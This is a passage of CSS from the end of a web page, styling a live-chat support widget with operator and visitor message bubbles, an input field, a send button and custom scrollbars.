    width: 7px;
    height: 7px;
    background-repeat: no-repeat;
    border-radius: 7px;
    border-width: 1px;
    border-style: solid;
    box-sizing: content-box;
    left: 0;
    right: auto;
    border-color: #4fd237;
}
#input-msg {
    border-top: 1px solid #babac05c;
    width: 100%;
    position: absolute;
    bottom: 0;
    height: 50px;
    margin-bottom: 20px;
}
#smstosup1 {
    margin-left: 10px;
    width: 100%;
    border: none;
    font-size: 15px;
}

.chaport-container .chaport-input-wrapper .chaport-send-icon, .chaport-input-wrapper .chaport-send-icon {
    opacity: 1;
    transform: scale(1);
    position: absolute;
    bottom: 15px;
    left: 7px;
    width: 18px;
    height: 18px;
    transition: opacity 0.2s linear,transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container.chaport-window-dark-gray .chaport-send-icon svg polygon, .chaport-content.chaport-window-dark-gray .chaport-send-icon svg polygon {
    fill: #414141;
    transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
#smstosupbutton1 {
    border-width: 0px;
    background: #fff;
    margin-right: 10px;
}
#smstosupbutton1 {
    cursor: pointer;
}
#smstosupbutton1:focus, #smstosupbutton1:active  {
    outline: none;
}
.chaport-window {
    visibility: hidden;
    opacity: 0;
}
.chat-block {
    overflow-y: auto;
    height: 300px;
    overflow-x: hidden;

}
#chat {
    padding-bottom: 15px;
}
.operators-msg {
    margin-top: 15px;
}
.operators-first-text {
    padding: 10px;
    width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.operators-msg-text {
    padding: 10px;
    max-width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.visitors-msg-text {
    margin-top: 15px;
    margin-right: 10px;
    margin-left: 80px;
    padding: 10px;
    min-width: 180px;
    border-radius: 8px;
    background-color: #005e5a;
    color: #fff;
}
.operators-photo img {
    width: 30px;
    height: 30px;
    border-radius: 50%;
    margin-left: 5px;
    margin-right: 5px;
}
.chat-block::-webkit-scrollbar {
    width: 7px;
}
.chat-block::-webkit-scrollbar-button {
    display: none;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
    </style>

</body></html>